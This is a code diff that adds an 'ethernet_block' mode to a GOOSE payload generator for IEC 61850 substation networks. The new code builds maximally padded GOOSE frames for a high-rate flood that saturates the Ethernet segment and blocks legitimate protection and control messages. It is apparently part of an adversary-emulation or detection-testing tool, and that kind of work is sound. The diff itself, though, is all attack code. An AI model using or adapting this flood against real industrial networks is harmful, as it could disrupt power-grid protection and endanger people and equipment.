@@ -254,6 +254,28 @@ def build_payload(marker: str | bytes, style: str = "trip_inject", **kwargs) -> 
         return _goose_frame(pdu, rnd, appid, dst_mac=_GOOSE_DST_GENERIC) + mb
 
 
+    # ── ethernet_block ────────────────────────────────────────────────────────
+    elif style == "ethernet_block":
+        # T1695.002 Block Communications: Ethernet — L2 link saturation. Emit a
+        # large GOOSE-framed payload as part of a high-rate flood pattern designed
+        # to saturate the Ethernet segment / switch fabric so legitimate
+        # command and reporting messages cannot get through. Distinct from
+        # protection_block (which saturates IED *message queues* at the app layer
+        # via replay): this targets the *link* with maximally-padded frames.
+        # The scenario drives the rate (many frames, minimal gap); each frame is
+        # a large multi-data-item GOOSE PDU to maximise bytes-on-wire.
+        st_num = _int(kwargs.get("st_num", rnd.randint(1, 50)))
+        sq_num = _int(kwargs.get("sq_num", rnd.randint(0, 500)))
+        # Pack many data items to push the frame toward the 1500-byte MTU so the
+        # flood consumes maximal link bandwidth per frame.
+        n_items = int(kwargs.get("n_items", 40))
+        data_items = []
+        for _ in range(n_items):
+            data_items.append(_data_float32(rnd.uniform(0.0, 240.0)))
+        pdu = _goose_pdu(gocb_ref, dat_set, go_id, st_num, sq_num,
+                         conf_rev, data_items, rnd, time_allowed=0)
+        return _goose_frame(pdu, rnd, appid, dst_mac=_GOOSE_DST_GENERIC) + mb
+
     # ── enumerate_ied ─────────────────────────────────────────────────────────
     elif style == "enumerate_ied":
         # Sends GOOSE with test=True flag to the generic multicast address.
